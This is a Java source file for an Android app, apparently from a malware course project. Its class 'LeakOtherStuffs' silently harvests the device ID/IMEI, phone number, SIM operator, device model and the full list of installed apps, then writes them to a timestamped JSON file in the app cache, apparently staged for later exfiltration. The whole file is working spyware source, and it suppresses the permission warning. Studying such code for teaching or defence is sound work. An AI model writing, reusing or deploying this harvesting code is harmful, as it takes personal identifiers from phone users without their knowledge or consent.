package com.malwareclass.malwareproject;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Writer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

public class LeakOtherStuffs {

    private static final String TAG = "LeakOtherStuffs";

    @SuppressLint("MissingPermission")
    public File[] leak(Context context) {
        Log.d(TAG, "Started");
        JSONObject stuffs = new JSONObject();

        // get IMEI, operator name and phone number

        TelephonyManager tm = (TelephonyManager) context.getSystemService(context.TELEPHONY_SERVICE);
        try {
            stuffs.put("Device SW version", tm.getDeviceSoftwareVersion());
            stuffs.put("Device ID", tm.getDeviceId());
            stuffs.put("SIM operator name", tm.getSimOperatorName());
            stuffs.put("Phone number", tm.getLine1Number());

        } catch (NullPointerException npe) {
            npe.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }


        // get device model
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        try {
            JSONObject phone = new JSONObject();
            phone.put("Manufacturer", manufacturer);
            phone.put("Model", model);
            stuffs.put("Phone model", phone);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        // GET ALL INSTALLED APPS
        PackageManager pm = context.getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);


        JSONArray appsArray = new JSONArray();
        for (ApplicationInfo packageInfo : packages) {
            try {

                JSONObject app = new JSONObject();
                app.put("Package name", packageInfo.packageName);
                app.put("Source dir", packageInfo.sourceDir);

                appsArray.put(app);

            } catch (JSONException e) {
                e.printStackTrace();
            }

        }

        try {
            stuffs.put("apps", appsArray);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        // save JsonArr to File
        Writer output = null;
        String pathname = "stuffs_" + new SimpleDateFormat("yyyy.MM.dd-HH.mm.ss").format(new Date()) + ".json";
        File file = new File(context.getCacheDir(), pathname);
        try {
            output = new BufferedWriter(new FileWriter(file));
            output.write(stuffs.toString());
            output.close();
            File[] files = new File[1];
            files[0] = file;
            return files;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
}
